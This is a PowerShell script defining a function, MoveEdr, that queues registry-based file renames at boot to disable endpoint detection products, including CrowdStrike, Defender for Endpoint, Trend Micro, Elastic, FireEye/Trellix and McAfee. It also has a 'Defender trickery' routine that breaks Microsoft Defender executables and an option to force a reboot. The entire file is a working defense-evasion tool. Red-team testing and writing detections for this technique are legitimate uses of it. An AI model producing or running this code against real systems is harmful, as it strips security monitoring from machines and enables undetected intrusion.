function MoveEdr{
	Param(
		[switch]$Clear,
		[switch]$CustomOnly,
		[switch]$DefenderHard,
		[switch]$Dump,
		[switch]$IgnoreOld,
		[switch]$Print,
		[switch]$Reboot,
		[switch]$Undo,
		[string[]]$CustomPaths = @(),
		[string[]]$FullyCustomPaths = @(),
		[string[]]$Load,
		[string] $Suffix = "_bak"
	)

	$regPath = "HKLM:SYSTEM\CurrentControlSet\Control\Session Manager\"
	$regKey = "PendingFileRenameOperations"
	
	function GetMoves{
		return (Get-ItemProperty -ErrorAction silentlyContinue -Path $regPath  -Name $regKey).$regKey
	}
	
	if ($Print){
		$pendingMoves = GetMoves
		if ($null -eq $pendingMoves){
			Write-Output "No Pending Moves"
		} else {
			for($i = 0; $i -lt ($pendingMoves.Count -shr 1); $i++) {
				Write-Host $pendingMoves[$i*2] --> $(if ($pendingMoves[$i*2+1] -eq "") {"DELETE"} else {$pendingMoves[$i*2+1]})
			}
		}
		Return
	}
	
	if ($Clear) {
		Clear-ItemProperty -ErrorAction silentlyContinue -Path $regPath -Name $regKey
		Return
	}
	
	if ($Dump) {
		$pendingMoves = GetMoves
		$dumped = "`"" + ($pendingMoves -join '","') + "`""
		if ($dumped -ne "`"`""){
				Write-Output $dumped
		} else {
			Write-Output "No Pending Moves"
		}
		
		Return
	}
	
	if ($Load) {
		$moves = $Load
	}
	elseif ($CustomOnly){
		$moves = @($CustomPaths | ForEach-Object {"\??\$_", "\??\${_}$Suffix"}) +
				 @($FullyCustomPaths | ForEach-Object {"\??\$_"})
	}
	else {
		$paths = @(
			# Crowdstrike
			 "C:\Program Files\CrowdStrike",
			 "C:\Windows\System32\drivers\CSDeviceControl.sys",
			 "C:\Windows\System32\drivers\CSFirmwareAnalysis.sys",
			 "C:\Windows\System32\drivers\CrowdStrike",

			# Defender for Endpoint
			"C:\Program Files\Windows Defender Advanced Threat Protection",
			
			# Trend Micro
			"C:\Program Files (x86)\Trend Micro\Security Agent",
			
			# Elastic EDR
			"C:\Program Files\Elastic",
			"C:\Windows\System32\drivers\elastic-endpoint-driver.sys",
			"C:\Windows\System32\drivers\ElasticElam.sys",

			#Fireeye/XAGT/xAgent/Trellix Endpoint Security
			"C:\Program Files (x86)\FireEye\xagt",
			"C:\Windows\System32\drivers\FeKern.sys",
			"C:\Windows\System32\drivers\FeElam.sys",
			"C:\ProgramData\FireEye\xagt\exts\MalwareProtection\sandbox\fe_avk.sys",
			"C:\Windows\FireEye",

			#McAfee/Trellix
			"C:\Program Files\McAfee",
			"C:\Program Files\Common Files\McAfee",
			"C:\Windows\System32\drivers\mfeaack.sys",
			"C:\Windows\System32\drivers\mfencbdc.sys"
			)
		
		# Windows Defender Trickery
		if ($DefenderHard){
			$defender_trickery = @("C:\ProgramData\Microsoft", "C:\ProgramData\Microsoft$Suffix",
							   "C:\ProgramData\Microsoft$Suffix\Windows Defender", "C:\ProgramData\Microsoft$Suffix\Windows Defender$Suffix",
							   "C:\ProgramData\Microsoft$Suffix", "C:\ProgramData\Microsoft")
		} else {
			$defenderPlatforms = (Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender\Platform').Name
			$defenderExes = "MsMpEng.exe", "MpDefenderCoreService.exe", "NisSrv.exe"
			$defender_trickery = @("C:\ProgramData\Microsoft", "C:\ProgramData\Microsoft$Suffix") +
					 @(@(foreach ($platform in $defenderPlatforms) {foreach ($exe in $defenderExes) {"C:\ProgramData\Microsoft$Suffix\Windows Defender\Platform\$platform\$exe"}}) | ForEach-Object {"$_","${_}$Suffix"}) +
					 @("C:\ProgramData\Microsoft$Suffix", "C:\ProgramData\Microsoft")
		}

		$moves = @($paths + $CustomPaths | ForEach-Object {"\??\$_", "\??\${_}$Suffix"}) +
				 @($FullyCustomPaths + $defender_trickery | ForEach-Object {"\??\$_"})
	}
	
	if ($undo) { # reverse the order in which moves are performed from top to bottom and switch source and destination
		$upperBound = $moves.Count - 1
		for ($index = 0; $index -lt ($moves.Count -shr 1); $index+=2){
			$moves[$index],$moves[$index+1],$moves[$upperBound -1 - $index],$moves[$upperBound - $index] =
			$moves[$upperBound - $index],$moves[$upperBound -1 -$index], $moves[$index+1],$moves[$index]
		}
	}

	if(!$IgnoreOld){
		$old = GetMoves
	} else {
		$old = $null
	}

	$reg = @{
		Path = $regPath
		Name = $regKey
		PropertyType = 'MultiString'
		Value = $old + $moves
	}

	New-ItemProperty -Force @reg | Out-Null

	if ($Reboot){
		Restart-Computer -Force
	}
}
